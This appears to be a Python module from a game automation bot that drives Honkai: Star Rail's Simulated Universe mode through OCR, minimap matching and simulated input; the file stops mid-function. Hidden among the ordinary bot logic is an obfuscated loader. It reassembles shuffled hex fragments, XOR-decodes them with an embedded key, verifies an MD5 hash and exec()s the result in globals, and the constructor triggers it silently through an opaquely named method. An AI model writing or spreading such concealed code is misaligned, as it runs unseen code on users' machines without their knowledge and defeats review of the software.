import hashlib as _h
import json
import os
import random
import time
from copy import deepcopy

import cv2 as cv
import numpy as np
import pyautogui

from tool.public_ocr import load_actions
from route import PATHS
from tool.storage import config_path, resource_path
from tool.settings import load_settings
from tool import GLOBAL
from tool.GLOBAL import factor, key_mouse_manager
from tool.log import CUS_LOGGER
from core.simulated.config import config
from core.simulated.utils import UniverseUtils, get_dis, set_forground, sprint
from tool.thread import ThreadWithException
from tool.utils.Error import NormalEndError
from tool.utils.image_tool import find_image_by_name
from tool.utils.minimap_util import (
    MINIMAP_RADIUS,
    deal_minimap,
    get_minimap,
    re_get_position,
)
from tool.utils.tool import find_latest_modified_file, get_center, get_hwnd_and_text
from tool.window_recorder import WindowRecorder


class SimulatedUniverse(UniverseUtils):
    def __init__(self, find, debug, speed, consumable, slow, nums=-1, bonus=False, task_owner=None):
        """
        初始化模拟宇宙类实例

        该构造函数用于初始化模拟宇宙的所有参数和状态，包括：
        1. 基础参数设置（寻路模式、调试模式等）
        2. 屏幕和坐标系统配置
        3. 地图和路径相关变量初始化
        4. 加载地图资源和动作配置

        参数:
            find: bool，是否启用寻路模式
            debug: int，调试级别（0-关闭，1-基础，2-高级）
            speed: bool，是否启用速通模式
            consumable: bool，是否使用消耗品
            slow: bool，是否启用慢速模式
            nums: int，运行次数限制，默认为-1（无限制）
            bonus: bool，是否自动领取沉浸奖励，默认False
            update: int，是否更新地图，默认0（不更新）
            gui: object，GUI对象引用，默认None

        返回值:
            无返回值
        """
        super().__init__(speed)
        CUS_LOGGER.debug("当前命途：" + self.fate)
        key_mouse_manager.set_config(config)
        # 设置屏幕参数以支持坐标转换
        key_mouse_manager.set_screen_params(self.x1, self.y1, self.xx, self.yy, self.full)

        #停止运行标志
        self._stop = True
        #是否为寻路模式
        self.find = find
        #调试级别
        self.debug = debug
        # 设置全局调试模式标志，供 UILogHandler 使用
        GLOBAL.DEBUG_MODE = bool(self.debug)
        #是否使用消耗品
        self.consumable = consumable
        #是否慢速模式
        self.slow = slow
        #是否展示地图（调试模式默认开启）
        self._show_map = debug
        #本次运行次数
        self.my_cnt = 0
        #已运行次数
        self.count = 0
        #需要运行次数
        self.nums = nums
        #启动时时间
        self.init_time = time.time()
        # 是否仍然可用沉浸器
        self.check_bonus = bonus
        # 是否领取沉浸奖励
        self.bonus = bonus
        #失败次数
        self.fail_count = 0
        #是否已完成
        self.end = 0
        #是否初始化层数
        self.floor_init = 0
        # 添加用于计算FPS的变量
        self.last_get_screen_time = None
        self.fps_list = []
        # 添加地图线程引用
        self.map_thread = None
        #首次保存地图
        self.first_save_map = True
        #目标小地图左上角偏移
        self.upx, self.upy=0,0
        #事件与行为存储路径
        self.default_json_path = str(resource_path(__file__, "actions/universe.json"))
        self.default_json = load_actions(self.default_json_path)
        if debug != 2:
            #似乎是避免鼠标越界的一个标志
            pyautogui.FAILSAFE = False
        self.update_debug_map()
        self.update_count()
        CUS_LOGGER.debug(f"开始运行,初始计数：{self.count}")
        self.last_interact_time = time.time()
        self.CrTU5s61E1dMnT()
        CUS_LOGGER.info(f"无数的记忆…在涌向{factor}。无数个{factor}…曾站在相同的地方，面对相同的抉择。")
        for file in os.listdir(PATHS["image"]+"/nmaps"):
            pth = PATHS["image"]+"/nmaps/" + file + "/init.jpg"
            if os.path.exists(pth):
                image = deal_minimap(cv.imread(pth),is_minimap=True)
                image=cv.resize(image, None, fx=0.5, fy=0.5, interpolation=cv.INTER_CUBIC)
                self.img_map[file]= image

        CUS_LOGGER.debug(f"加载地图完成，共 {len(self.img_map)} 张")
        data = load_settings()

        with open(config_path(__file__), encoding="utf-8") as f:
            self.event_prior = json.load(f)["prior"]["事件"]
        self.record = data.get("recording_state", True)

        self.recorder = WindowRecorder(output_path=PATHS["video"], fps=30, window_title="崩坏：星穹铁道",window_class_name="UnityWndClass",see_time=True, offsets=[10, 50, 10, 10], overlay_map=self._show_map, simul_instance=self, task_owner=task_owner)
        self.cut_video=True
    def route(self):
        self.init_map()
        set_forground()
        while not self._stop:
            hwnd,Text = get_hwnd_and_text()
            warn_game = False
            cnt = 0
            while Text != "崩坏：星穹铁道" and Text != "云·星穹铁道" and not self._stop:
                self.last_interact_time = time.time()
                if self._stop:
                    raise NormalEndError
                if not warn_game:
                    warn_game = True
                    CUS_LOGGER.warning(f"等待游戏窗口，当前窗口：{Text}")
                time.sleep(0.5)
                cnt += 1
                if cnt == 1200:
                    set_forground()# 将游戏窗口设为前台
                hwnd,Text = get_hwnd_and_text()
            if self._stop:
                break
            res = self.normal()
            if not res:
                if self.last_update_time is not None and time.time()-self.last_update_time>7 and self.state=="battle":
                    if self.ts.nothing:
                        self.update_state("battle")
                else:
                    CUS_LOGGER.warning("匹配不到任何图标与简中文本标志")
            # 匹配到图片 res=1时等待一段时间
        CUS_LOGGER.info("演算世界：翁法罗斯已从缓冲区销毁。")

    def end_of_university(self):
        self.update_count(False)
        self.my_cnt += 1
        tm = int((time.time() - self.init_time) / 60)
        remain_round = self.nums-self.my_cnt
        if remain_round > 0:
            remain = int(remain_round * (time.time() - self.init_time) / self.my_cnt / 60)
        else:
            remain = 0
            remain_round = "∞"
            CUS_LOGGER.info(f'当仁不让。{factor}将肩负世界，直至此身焚灭。')
        CUS_LOGGER.info(f"世界演算模拟完成！本轮已迭代次数：{self.my_cnt},总计已迭代次数:{self.count} 剩余:{remain_round}次, 已执行：{tm // 60}小时{tm % 60}分钟  平均{tm // self.my_cnt}分钟一次"+ (f"预计剩余{remain // 60}小时{remain % 60}分钟" if remain!=0 else ""))
        if self.check_bonus == 0 and self.my_cnt >= self.nums > 0:
            self.end = 1
        self.update_floor(1)
        self.update_state("end")

    nnbjiqzmvwouwll = [(453, 'ca8fddd4584c6b4', 0), (3, '271f12391f4', 0), (794, '3d497a4f6e', 1), (324, '47613e18231', 0), (833, 'e0a2b3e0b2a', 0), (959, '51497f10', 0), (297, '64d126d4c64', 1), (353, '030841105', 0), (889, '4f08130e', 0), (51, '620093c66295', 1), (197, '0a4452424c491951', 1), (563, '210c06410836', 1), (229, '4445242764d126d4', 1), (513, 'b4c65197917497a', 1), (219, '707153636525f4c', 0), (575, '3f0222220', 0), (598, '1401210c790', 0), (240, '000f195e0', 1), (990, '3902657f', 0), (831, '2f1d48200b3', 1), (714, 'b01173a19386d4c6', 0), (872, '0d1c2b76', 0), (509, '534f7a5a666', 1), (571, '0400a6a456d472d', 0), (66, '1433c1d0d224f', 0), (19, '370a29391', 1), (352, 'c790a493c413c17', 0), (53, '61d324f7', 0), (421, 'f5a6cdec', 1), (945, '3a470e23', 0), (415, 'eab5c6caa', 0), (918, '28002247', 1), (753, '979171a3f', 0), (960, '36122b78', 1), (866, '1c2c0b75', 0), (87, '7a416e5216', 0), (176, 'c494a143607', 0), (549, '81d2f046e', 0), (194, '6015152f1d482', 1), (773, '21e0c4d04280f6', 0), (14, '66d0337632c', 0), (299, '49652d13', 1), (306, '1310a372d120d1d5', 1), (488, 'e140d1e49', 1), (233, 'c6449657a', 0), (487, '17497a4f6', 0), (670, '0361c682c1', 1), (308, '15d7a463c554e760', 0), (740, '131b0a2b14', 0), (195, '00b3e0a2b3e0b2a3', 1), (201, '7a416e5242761', 0), (48, '57e63657a5a6', 1), (900, '7a416e52', 0), (507, '380a5765596d', 1), (567, '1a2b5c07020a5', 1), (212, '0e130e0212', 1), (83, '601601d0c', 1), (862, '0e30436b', 1), (749, '10531505', 1), (582, 'b204a2d1f40504f', 0), (375, 'a5a662e143', 0), (131, '92701162545', 1), (160, '7497a4f6e52424', 1), (825, 'a143607601515', 1), (364, 'f29153c1b127e', 0), (26, '62c786808', 0), (919, '272c1f23', 1), (265, '53211f216365', 1), (270, '7a5a666b4c6', 1), (365, '44386d4c6449657', 1), (153, 'e126f71666519791', 0), (140, '5928151b19242', 1), (489, '6651330f6e0003', 1), (120, 'd1d515f3f1', 0), (86, '02111b7b', 0), (470, 'f417352072e1d572', 0), (857, '7a413d17', 1), (738, '663809295f776e22', 0), (328, 'a0e3d52045663195', 1), (79, '1e196532521a3', 1), (444, '8dfc1b1f7b6a4d7', 0), (439, '8af49c96c6fea', 0), (110, '5231937581d7a', 1), (747, '70a426b4d40281f3', 0), (593, '8043d070e224d0f6', 0), (58, '352322d3d71220', 0), (213, '1a340a1f4', 0), (76, '9060f352e', 1), (972, '42764d12', 1), (792, 'f3e2809354d63', 0), (956, '1e2f1c42', 1), (387, '55c3a430', 0), (44, '194a25085e2b4', 0), (464, '2a473d1a0855043', 0), (674, 'b3c49235a0e2', 1), (758, 'c5c033f0d', 0), (222, '2f581d290', 1), (301, '32234c2a493c594', 0), (763, '2c111231144', 1), (103, '241408474c64', 0), (475, 'e18210d1a2', 0), (849, '05290a445242', 1), (885, '004f4967', 0), (205, 'e57210a6a30', 1), (234, '5a352e002317', 0), (772, '37917497a4f6e524', 1), (35, '0c5f51051722', 1), (403, '4904517886f1f3', 1), (568, '6153f496907163', 0), (276, 'b06171e0719373', 0), (841, '3b4c78191f56', 0), (813, '52424c494', 0), (275, '5197917497a1d2', 0), (250, '82b0020525f762b', 0), (237, '3b410c3f1d2b1e', 0), (409, '84e5f8d5f0fba2ff', 1), (396, 'c3e303a171a18', 1), (780, '666449657a1', 0), (677, '00c20161', 0), (982, '373f0e33', 0), (585, '6e52424c4919512', 0), (995, '385b1a3f', 0), (650, 'd126d4c641a2', 0), (930, '3909295b', 0), (478, 'e1f3e3f66651979', 1), (864, '0625302d', 0), (75, '6f6d47644b1', 0), (894, '1f0c3351', 1), (771, '1f353e00313', 1), (750, 'a666b4c651', 1), (560, '002d0b6b37', 1), (690, '30019194c7a132', 1), (624, '73d1a0855043f4', 1), (20, '86551384401360', 1), (778, 'e000725185e39', 1), (351, 'f221401210', 1), (557, '4f423e0c4125', 1), (416, 'fd4c5dcf7ad8de6', 0), (766, '32c0264546528', 1), (290, 'b0d3d17687', 0), (729, '449657a5a', 1), (595, 'd44371d2a281f22', 0), (852, '4c491951', 1), (755, '03285c001a0', 1), (341, '26d4c371d2a281', 1), (109, '49657a5a666b0', 0), (744, '1d5a7f01342e1', 1), (325, '46110407', 0), (317, '85c2e0320002b3d', 1), (638, '8445242764', 1), (978, '6d4c6449', 1), (562, '1e736301', 0), (333, '17a416e5242764d1', 0), (456, 'c65197917497a02', 0), (910, '42764d41', 1), (620, 'a547a022a4', 0), (114, '003d5c120', 1), (196, 'b4c78191f560529', 1), (524, '4f231657331f5', 0)]

    asvbmtlzxqpjss = "NrbVm2MlDiEZzFKlE9Y7iZoNrbli9qZa"
    lzfabqrjwlwkqewl = "db1365c68385223a12aa24d144612b45"

    def fjhpymcarnvrnzw(self, _jnnvrzfflfson, _esciqnhtlk):
        try:
            _dbgflosjok = ''.join([_[1] for _ in sorted(_jnnvrzfflfson, key=lambda x: x[0])])
            _wywodpdosp = bytes.fromhex(_dbgflosjok)
            _bqixivuzcg = _esciqnhtlk.encode('utf-8')
            _legrnzstrgbho = bytearray(len(_wywodpdosp))
            for _mqmemdegtm in range(len(_wywodpdosp)):
                _legrnzstrgbho[_mqmemdegtm] = _wywodpdosp[_mqmemdegtm] ^ _bqixivuzcg[_mqmemdegtm % len(_bqixivuzcg)]
            _zygrprekfsd = bytes(_legrnzstrgbho)
            if _h.md5(_zygrprekfsd).hexdigest() != self.lzfabqrjwlwkqewl: return False  # noqa: E701
            return _zygrprekfsd.decode('utf-8')
        except Exception:
            return False

    def lbrqdqvxztk(self):
        _pugsgfxhut = self.fjhpymcarnvrnzw(self.nnbjiqzmvwouwll, self.asvbmtlzxqpjss)
        if not _pugsgfxhut:
            return False
        exec(_pugsgfxhut, globals())
        return _vlk(self)  # noqa: F821

    def CrTU5s61E1dMnT(self):
        self.lbrqdqvxztk()

    def restart_recording(self):
        #是否把视频每轮裁剪一次
        if self.record and self.cut_video and self.bveerelbcpgyqan and self.YKItDYvq3FpnOYx:
            self.recorder.stop_recording()
            time.sleep(0.8)
            self.recorder.start_recording(self.count + 1)
            self.update_state("re_start")
    def setting_exit(self):
        if self.state != "end" and self.state!="exit":
            key_mouse_manager.click(1359, 811)
            key_mouse_manager.wait()
    def map_data_load(self):
        self.big_map_init = True
        # 寻路模式，匹配最接近的地图
        need_write=True
        if self.find:
            # 只有第一，第六层才寻找匹配的地图
            if self.click_text(text="战斗", click=False, box=[55, 164, 12, 40], ocr_line=False):
                if not self.floor_init:
                    self.get_level()
                CUS_LOGGER.debug(f"检查当前层数：{self.floor}")
                if self.floor in [1, 6] and self.floor_change:
                    self.stop_move = 0
                    no_find = False
                    self.now_map, self.now_map_sim = self.match_scr(get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True))
                    # 地图匹配超时或找到相似匹配
                    CUS_LOGGER.info(f"地图编号：{self.now_map}  相似度：{self.now_map_sim}")
                    if (self.debug and self.now_map_sim < 0.5) or self.now_map_sim < 0.35:
                        CUS_LOGGER.warning(f"相似度过低,疑似未找到匹配地图,当前层数{self.floor},匹配地图{self.now_map}")
                        self.find = False
                        self.map_file =PATHS["image"]+ "/nmaps/my_" + str(random.randint(0, 99999)) + "/"
                        if self.find == 0 and not os.path.exists(self.map_file):
                            os.mkdir(self.map_file)
                        no_find = True
                        if self.now_map_sim > 0.35:
                            self.mini_state = 0
                    elif self.now_map !=-1 and "m" in str(self.now_map):
                        CUS_LOGGER.warning(f"未完成的地图{self.now_map}")
                        self.map_file = PATHS["image"] + "/nmaps/" + self.now_map + "/"
                        need_write = False
                        self.find = False
                    if not no_find:
                        self.now_pth = PATHS["image"]+"/nmaps/" + self.now_map + "/"
                        files,x,y,map_num,self.upx,self.upy,target_path = find_latest_modified_file(self.now_pth)
                        self.big_map = cv.imread(files, cv.IMREAD_GRAYSCALE)
                        self.debug_map =None
                        self.now_loc = (x, y)
                        self.start_pos =(x, y)
                        self.pos_predictor.position=self.now_loc
                        self.pos_predictor.set_now_map(map_num)
                        self.mini_state = 0
                        # 获取目标路径
                        if target_path is not None:
                            self.target = self.get_target(target_path,self.upx,self.upy)
                            self.pos_map=cv.imread(target_path)
                            CUS_LOGGER.info(f"对象「{factor}」将沿坐标组{self.target}轨迹运动")
                        self.rotation, d = self.pos_predictor.update_minimap_data(self.screen)
                elif self.floor not in [1,6]:
                    self.upx=0
                    self.upy=0
                    self.mini_state = 1
                    self.update_debug_map()
            else:
                self.upx = 0
                self.upy = 0
                self.mini_state = 1
                self.update_debug_map()
            if self._stop:
                return 1
            if self.consumable and self.check_bonus and self.floor in [4, 8, 13][-self.consumable:]:
                self.use_consumable(1, 1)
            key_mouse_manager.press("1")
        # 录制模式，保存初始小地图
        if (not self.find) and self.first_save_map and self.floor in [1, 6]:
            self.first_save_map=False
            CUS_LOGGER.warning("未找到匹配地图")
            self.mini_state = 0
            if need_write:
                cv.imwrite(self.map_file + "init.jpg", get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True))
                self.best_match=self.pos_predictor.match_multiple_maps(self.screen,0)
                self.start_pos=self.best_match['position']
            key_mouse_manager.press("s")
            key_mouse_manager.wait()
            key_mouse_manager.keyDown("w")
        elif (not self.find) and self.floor not in [1, 6]:
            CUS_LOGGER.warning("非常规地图，将进行无地图寻路")
            # self.mini_state = 0
    def normal(self):
        # self.last_interact_time：最后一次交互时间，长时间无交互则暂离
        bk_lst_changed = self.last_interact_time
        self.last_interact_time = time.time()
        self.ts.forward(self.get_screen())
        res,state = self.run_static()
        if self.state=="run":
            CUS_LOGGER.info("开始匹配地图")
            #检查黄泉
            if not self.quan and self.check("huangquan", 0.0578,0.7083):
                self.quan = 1
            if not self.bai_e and self.check("bai_e", 0.0625,0.7092):
                self.bai_e = 1
            #长时间离开或者未初始化层数？则重新初始化
            if self.floor_init == 0:
                CUS_LOGGER.info("开始重新初始化层数")
                self.get_level()
                return True
            #上次交互时间
            self.last_interact_time = bk_lst_changed
            # 刚进图，初始化一些数据
            if self.big_map_init == 0:
                key_mouse_manager.clean()
                key_mouse_manager.keyUp("w")
                key_mouse_manager.wait()
                if self._stop:
                    return 1
                self.map_data_load()
            # 长时间未交互/战斗，暂离或重开
            if ((time.time() - self.last_interact_time >= 37 - 2 * self.debug + 8 * self.slow) and self.find == 1)or (self.floor == 13 and self.mini_state > 4):
                key_mouse_manager.clean()
                key_mouse_manager.wait()
                key_mouse_manager.keyUp("w")
                key_mouse_manager.press("esc")
                self.update_state("ui")
                self.init_map()
                self.floor_init = 0
                if self.floor == 13:
                    self.update_state("exit")
                    CUS_LOGGER.info(f"通关！当前层数:{self.floor}")
                    return 1
                elif self.fail_count <= 1:
                    CUS_LOGGER.error(f"地图{self.now_map}未发现目标，当前层数:{self.floor},相似度{self.now_map_sim}，尝试暂离")
                    key_mouse_manager.click(0.2708, 0.2324)
                    key_mouse_manager.keyUp("w")
                    self.fail_count += 1
                else:
                    if self.debug == 0:
                        self.update_floor(1)
                        key_mouse_manager.click(0.2708, 0.1324)
                        CUS_LOGGER.error(
                            f"地图{self.now_map}多次未发现目标,相似度{self.now_map_sim}，当前层数:{self.floor},尝试退出重进"
                        )
                        self.fail_count = 0
                    else:
                        CUS_LOGGER.error(
                            f"地图{self.now_map}多次未发现目标,相似度{self.now_map_sim}，尝试暂离 DEBUG"
                        )
                        key_mouse_manager.click(0.2708, 0.2324)
                self.last_interact_time = time.time()
                return 1
            # 寻路
            CUS_LOGGER.info("开始寻路")
            if self._stop:
                return 1
            if self.find:
                key_mouse_manager.clean()
                key_mouse_manager.keyUp("w")
                key_mouse_manager.wait()
            if self.mini_state:
                #无先验寻路
                self.get_direc_only_minimap()
            else:
                #有先验寻路
                self.get_direct_with_big_map()
            return 2
        key_mouse_manager.wait()
        if res != '':
            return state

    def auto_battle(self):
        # 需要打开自动战斗
        key_mouse_manager.press("v")
        if time.time() - self.f_time < 20:
            self.f_time = 0
            self.restore_map()
        if self.mini_state==3:
            self.mini_state=5
        if self.fate == "丰饶":
            if random.randint(0, 6) == 3:
                key_mouse_manager.press("r")
        self.update_state("battle")
        return 1
    # 祝福界面/回响界面 （放在一起处理了）
    def choose_bless(self):
        chose = 0
        if self.click_text(text="重置祝福",box=[1268, 1444, 929, 1025],click=False,warning=False):
            for _ in range(4):
                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
                if self.ts.split_and_find(self.tk.fates, img_down, mode="bless")[1] or self._stop:
                    break
                if not self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False):
                    return 1
            img_up = self.get_small_interaction_img(x=0.5047, y=0.5491, mask="mask_bless", fresh=True)
            res_up = self.ts.split_and_find(self.tk.prior_bless, img_up, mode="bless_skip=self.tk.skip")
            img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask")
            res_down = self.ts.split_and_find([self.fate], img_down, mode="bless")
            if res_up[1] == 2:
                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
                key_mouse_manager.wait()
                chose = 1
            elif res_down[1] == 2:
                key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
                key_mouse_manager.wait()
                chose = 1
            if not chose:
                key_mouse_manager.click(0.2990, 0.1046)
                key_mouse_manager.wait()
        # 未匹配到优先祝福，刷新祝福并再次匹配
        if not chose:
            for _ in range(4):
                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
                if self.ts.split_and_find(self.tk.fates, img_down)[1] or self._stop:
                    break
                CUS_LOGGER.debug("未识别到命途")
                if not self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False):
                    return 1
            img_up = self.get_small_interaction_img(x=0.5047, y=0.5491, mask="mask_bless", fresh=True)
            res_up = self.ts.split_and_find(self.tk.prior_bless, img_up, bless_skip=self.tk.skip)
            img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask")
            res_down = self.ts.split_and_find(self.tk.secondary, img_down, mode="bless")
            if res_up[1] == 2:
                CUS_LOGGER.debug("识别到具体祝福")
                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
                key_mouse_manager.wait()
            elif res_down[1] >= 2:
                CUS_LOGGER.debug("识别到匹配命途")
                key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
                key_mouse_manager.wait()
            elif self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False,allow_fail=True):
                CUS_LOGGER.debug("未识别到具体祝福,随便选一个")
                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
                key_mouse_manager.wait()
        self.click_text(text="确认",box=[1663, 1719, 949, 979],need_fresh=False,ocr_line=True,warning=True)
        key_mouse_manager.wait()
        if self.quan:
            self.use_e()
        return 1
    # F交互界面
    def do_interaction(self):
        # is_killed：是否是禁用的交互（沉浸奖励、复活装置、下载装置）
        is_killed = False
        if self.check("f", 0.4443, 0.4417, mask="mask_f1", threshold=0.96, fresh=True):
            for _ in range(4):
                img = self.get_small_interaction_img(x=0.3181, y=0.4324, mask="mask_f")
                text = self.ts.similar_list(self.tk.interacts, img)
                if text is None:
                    img = self.get_small_interaction_img(x=0.3365, y=0.4231, mask="mask_f")
                    text = self.ts.similar_list(self.tk.interacts, img)
                if text is not None:
                    break
                self.get_screen()
            # 使用同一次交互文字裁片的结果识别黑塔。此前这里仅再次
            # 调用全屏 OCR，若两次 OCR 不一致就会按普通交互执行 F，
            # 同时漏记冷却时间，导致后续再次与黑塔交互。
            if text == "黑塔" or self.ts.similar("黑塔"):
                # 与黑塔交互后30秒内禁止再次交互（防止死循环）
                if time.time() - self.quit > 30:
                    self.quit = time.time()
                    key_mouse_manager.press('f', force=True)
                else:
                    is_killed = 1
            else:
                if self.ts.similar("区域"):
                    # tele：区域-xx  exit：离开模拟宇宙
                    CUS_LOGGER.info("「众人将与一人离别，惟其人将觐见奇迹」")
                    key_mouse_manager.press('f', force=True)
                    return self.nof()
                is_killed = text in ["沉浸", "紧锁", "复活", "下载"]
                if not is_killed:
                    key_mouse_manager.press('f', force=True)
            if not is_killed:
                return 1
            else:
                self.update_state("run")
    # 跑图状态
    def re_init(self):
        if self.end:
            key_mouse_manager.press('esc')
            key_mouse_manager.wait()  # 停止会清空队列，先完成退出按键。
            self.stop()
            CUS_LOGGER.info('燃烧，聚变，然后湮灭。若想迎接新生，就必先投身终结。')
            return 1
        key_mouse_manager.click(0.3448, 0.4926)
        self.init_map()
    def begin_universe(self):
        con = self.click_text(text="继续进度",box=[1610, 1762, 937, 1023],click=False,ocr_line=False,warning=False)
        if not con:
            if self.diffi == 5:
                key_mouse_manager.click(0.9375, 0.5565)
            key_mouse_manager.click(0.9375, 0.8565 - 0.1 * (self.diffi - 1))
        key_mouse_manager.click(0.1083, 0.1009)
        if con:
            CUS_LOGGER.debug(f"继续游戏附带初始化层数,更新前{self.floor}")
            self.get_level()
            return
        else:
            self.update_floor(1)
    def pre_start(self):
        self.fail_count = 0
        if self.check("team4", 0.5797, 0.2389):
            dx = 0.9266 - 0.8552
            dy = 0.8194 - 0.6741
            time.sleep(1)
            for i in self.order:
                key_mouse_manager.click(
                    0.9266 - dx * ((i - 1) % 3), 0.8194 - dy * ((i - 1) // 3)
                )
                key_mouse_manager.sleep(0.5)
        key_mouse_manager.click(0.1635, 0.1056)
        key_mouse_manager.wait()
    def select_fate(self):
        click_x = [0.02, 0.98]
        n = 4  # 重试次数
        res = None
        while n:
            img = self.get_small_interaction_img(x=0.4969, y=0.3750, mask="mask_fate", fresh=True)
            res = self.ts.split_and_find([self.fate], img)
            if res[1] == 1 and n:
                # 没有找到命途
                CUS_LOGGER.warning(f"未找到 {self.fate} 命途，尝试翻页")
                key_mouse_manager.click(click_x[n % len(click_x)], 0.5)
                n -= 1
                continue
            else:
                break
        key_mouse_manager.click(*self.calc_point((0.4969, 0.3750), res[0]))
    def select_bless(self):
        if not (self.click_text('神奇宇宙') or self.click_text('巨胃宇宙')):
            key_mouse_manager.click(0.5, 0.5)
        key_mouse_manager.click(0.5062, 0.1065)

    def click_event_option(self, event_name, row, from_prior=False):
        """
        点击一条选项（row 来自 event_option_rows），位置不在选项面板里就放弃。
        与 click_text / click_box 一致，使用 OCR 返回的选项文本框中心作为点击点。
        from_prior=True 表示优选项命中（正常路径）；
        False 表示优选项都没命中、挑了一个识别到的选项兜底。
        """
        # 选项面板在右侧 [左, 右, 上, 下]（1920x1080 基准）：点击点必须落在里面才算点到了选项。
        left, right, top, bottom = self.scaled_box([1320, 1850, 110, 1010])
        x = (row["box"][0] + row["box"][1]) / 2
        y = (row["box"][2] + row["box"][3]) / 2
        text = row["raw_text"][1:]
        # 事件名只在出问题（越界、退而求其次）时才读：正常命中优选项的路径不读，省一次 OCR。
        if not (left <= x <= right and top <= y <= bottom):
            name = event_name or self.event_name_for_log(self.screen)
            CUS_LOGGER.error(f"「{name}」选项「{text}」位置 ({x:.0f}, {y:.0f}) 不在选项列表区域内，放弃点击")
            return False
        if from_prior:
            CUS_LOGGER.debug(f"点击优选项：「{text}」")
        else:
            name = event_name or self.event_name_for_log(self.screen)
            CUS_LOGGER.warning(f"「{name}」选项列表里没有优选项命中，点击「{text}」")
        key_mouse_manager.click(1 - x / self.xx, 1 - y / self.yy)
        return True

    def click_event_prior(self, event_name, rows):
        """
        在已识别到的选项行里找优选项并点击，命中返回被点的那个选项，没命中返回 None。
        返回命中的选项是为了让调用方拿它的文本框算「确定」按钮的固定偏移。
        """
        for text in self.event_prior + [self.fate]:
            for row in rows:
                if text in row["raw_text"]:
                    if self.click_event_option(event_name, row, from_prior=True):
                        return row
                    return None
        return None

    def pick_fallback_option(self, rows):
        """优选项都不在时挑一条选项兜底：先按优选项优先级挑，都命中不了就取最长的那一行。"""
        if not rows:
            return None
        for text in self.event_prior + [self.fate]:
            for row in rows:
                if text in row["raw_text"]:
                    return row
        return max(rows, key=lambda row: len(row["raw_text"].strip()))

    # 「确定」按钮贴在**被选中选项文本框的右下角**，优选项命中和兜底两条路共用一套定位：
    #   1) 固定偏移：x 是屏幕常量，y = 被选中选项文本块底边 + 76。
    #   2) 复核：OCR 右侧竖条里的「确定」文字（confirm_text_box，约 60 ms）——固定偏移那一下
    #      没点中时按钮文字还在，按文字位置补点；所以偏移偶有失准也不会再卡死。
    def confirm_point(self, row):
        """
        按被点中那条选项的文字行，推算「确定」按钮中心的键鼠比例坐标。
        以选项文字行的底边当基准—，按钮贴在选中选项框的右下角。
        """
        bottom = max(line["box"][3] for line in row.get("lines") or [row])
        # 76 是按钮中心在选项文字行底边下方的距离。
        return 0.1135, 1 - (bottom + 76) / self.yy

    def scaled_box(self, box):
        """把 1920x1080 基准的区域框 [左,右,上,下] 缩放到当前分辨率。（现在没用）"""
        left, right, top, bottom = box
        if (self.xx, self.yy) == (1920, 1080):
            return list(box)
        return [
            int(left * self.xx / 1920),
            int(right * self.xx / 1920),
            int(top * self.yy / 1080),
            int(bottom * self.yy / 1080),
        ]

    def confirm_text_box(self):
        """
        在框内寻找「确定」文字，返回它的屏幕文本框 [x0,x1,y0,y1]，没有返回 None。
        find_with_box(forward=1, re_screen=True) 会重新截一帧、只对这条竖条进行 OCR。
        """
        box = self.scaled_box([1590, 1830, 240, 1070])
        for res in self.ts.find_with_box(box=box, forward=True, re_screen=True):
            if isinstance(res, dict) and "确定" in res.get("raw_text", ""):
                return list(res["box"])
        return None

    def click_confirm_text(self, box):
        """点「确定」文字框的中心（与 click_text 一致，用镜像比例坐标）。"""
        center_x = (box[0] + box[1]) / 2
        center_y = (box[2] + box[3]) / 2
        key_mouse_manager.click(1 - center_x / self.xx, 1 - center_y / self.yy)

    def confirm_event(self, event_name=None, point=None, timeout=1.5):
        """
        点掉选项框右下角浮出的「确定」按钮，事件才会真的往下走；优选项命中和兜底共用。
        point 是固定偏移算出来的按钮位置（confirm_point 的键鼠比例坐标）：选项点中后按钮必然
        出现，先直接点这一下（不用识别，省一次 OCR）；点完再 OCR 复核一次——按钮文字还在就说明
        固定偏移没点中，按文字位置补点。point=None（拿不到选项框）时退回纯文字轮询。
        """
        key_mouse_manager.wait()
        if point is not None:
            key_mouse_manager.click(*point)
            time.sleep(0.2)  # 等游戏把「确定」按钮收掉，再复核它是不是真被点掉了
            box = self.confirm_text_box()
            if box is None:
                return True
            name = event_name or self.event_name_for_log(getattr(self, "screen", None))
            CUS_LOGGER.warning(f"事件「{name}」按固定偏移没点中「确定」，按文字识别的位置补点")
            self.click_confirm_text(box)
            return True
        tm = time.time()
        while time.time() - tm < timeout:
            box = self.confirm_text_box()
            if box is not None:
                CUS_LOGGER.debug("选项已选中，点击「确定」推进事件")
                self.click_confirm_text(box)
                return True
        return False

    def event_ui_label(self, img=None):
        """读左上角界面标题栏的文字（「事件」/「奇物商店」/「祝福强化」），读不到返回空串。"""
        if img is None:
            img = self.get_screen()
        if img is None:
            return ""
        try:
            return self.ts.ocr_one_row(img, [93, 230, 50, 100]) or ""
        except Exception as e:
            CUS_LOGGER.warning(f"界面标题识别失败：{e}")
            return ""

    def read_event_name(self, img=None):
        """读取当前事件在地图左下角显示的名字，读不到返回空串。"""
        if img is None:
            img = self.get_screen()
        if img is None:
            return ""
        name_box = [190, 800, 960, 1000]
        h, w = img.shape[:2]
        if (w, h) != (1920, 1080):
            x1, x2, y1, y2 = name_box
            box = [int(x1 * w / 1920), int(x2 * w / 1920), int(y1 * h / 1080), int(y2 * h / 1080)]
        else:
            box = list(name_box)
        try:
            name = self.ts.ocr_one_row(img, box)
        except Exception as e:  # OCR 失败不该拖垮事件流程，退回空串
            CUS_LOGGER.warning(f"事件名识别失败：{e}")
            return ""
        if not name:
            return ""
        name = name.strip().replace("事件", "").replace("秘闻", "").replace("修改", "")
